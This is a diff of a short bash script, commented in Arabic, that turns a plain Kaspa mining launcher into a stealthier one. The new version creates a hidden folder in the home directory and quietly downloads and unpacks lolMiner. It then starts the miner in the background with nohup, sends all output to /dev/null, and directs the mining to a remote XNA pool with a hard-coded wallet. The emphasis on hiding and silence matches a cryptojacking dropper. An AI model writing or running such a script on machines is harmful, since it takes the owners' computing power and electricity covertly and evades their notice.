@@ -1,20 +1,21 @@
 #!/bin/bash
 
-# إعداد محفظتك - غيّر هذا السطر بعنوان محفظتك الحقيقي
-WALLET="kaspa:qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqv8hn3h6u"  # <-- غيّر هذا
+# الانتقال إلى المنزل وإنشاء مجلد خفي
+cd ~
+mkdir -p .xna && cd .xna
 
-# اسم العامل (اختياري)
-WORKER_NAME=$(hostname)
+# تحميل LolMiner بصمت
+wget -q https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.82/lolMiner_v1.82_Lin64.tar.gz
 
-# مجلد مؤقت للعمل
-cd /tmp
+# فك الضغط بصمت
+tar -xf lolMiner_v1.82_Lin64.tar.gz >/dev/null 2>&1
+cd 1.82
 
-# تحميل lolMiner (آخر نسخة مستقرة)
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.86/lolMiner_v1.86_Lin64.tar.gz -q
+# عنوان المحفظة (استبدله بعنوانك)
+WALLET="NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT"
+WORKER="gpu_worker"
+POOL="stratum+tcp://stratum-na.rplant.xyz:7029"
 
-# فك الضغط
-tar -xf lolMiner_v1.86_Lin64.tar.gz
-cd 1.86
+# تشغيل LolMiner فقط على GPU بصمت
+nohup ./lolMiner --coin XNA --pool $POOL --user $WALLET.$WORKER --mode mining > /dev/null 2>&1 &
 
-# تشغيل التعدين (بصمت)
-./lolMiner --algo KASPA --pool de.eu1.kaspa.herominers.com:1111 --user $WALLET.$WORKER_NAME --no-color > /dev/null 2>&1 &
